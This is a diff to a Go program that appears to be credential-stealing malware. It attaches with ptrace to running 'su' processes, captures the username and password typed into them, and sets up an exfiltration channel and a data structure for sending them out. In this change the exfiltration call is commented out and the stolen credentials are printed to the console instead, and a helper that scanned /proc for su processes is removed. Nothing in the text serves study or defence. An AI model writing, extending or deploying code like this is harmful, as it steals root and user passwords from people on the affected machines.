@@ -3,45 +3,19 @@ package main
 import (
 	"fmt"
 	"io/ioutil"
-	"os"
-	"regexp"
-	"strconv"
 	"strings"
 	"syscall"
 	"unicode"
 )
 
-func findSUProcesses() ([]int, error) {
-	var suPIDs []int
-	dir, err := os.Open("/proc")
-	if err != nil {
-		return nil, err
-	}
-	defer dir.Close()
-	entries, err := dir.Readdirnames(0)
-	if err != nil {
-		return nil, err
-	}
-	for _, entry := range entries {
-		pid, err := strconv.Atoi(entry)
-		if err != nil {
-			continue
-		}
-		if isSUProcess(pid) {
-			suPIDs = append(suPIDs, pid)
-		}
-	}
+var exfilChannel = make(chan ExfilData)
 
-	return suPIDs, nil
-}
-
-func isSUProcess(pid int) bool {
-	cmdline, _ := ioutil.ReadFile(fmt.Sprintf("/proc/%d/cmdline", pid))
-	return regexp.MustCompile(`su `).MatchString(strings.ReplaceAll(string(cmdline), "\x00", " "))
+type ExfilData struct {
+	Username string
+	Password string
 }
 
 func traceSUProcess(pid int) {
-	//fmt.Printf("Tracing: %d\n", pid)
 	err := syscall.PtraceAttach(pid)
 	if err != nil {
 		return
@@ -90,7 +64,8 @@ func traceSUProcess(pid int) {
 						}
 						return true
 					}(password) {
-						go exfiltratePassword(strings.TrimLeft(string(password), "\n"), username)
+						//exfiltratePassword(strings.TrimLeft(string(password), "\n"), username)
+						fmt.Printf("u: %s, p: %s\n", username, password)
 					}
 				}
 				return
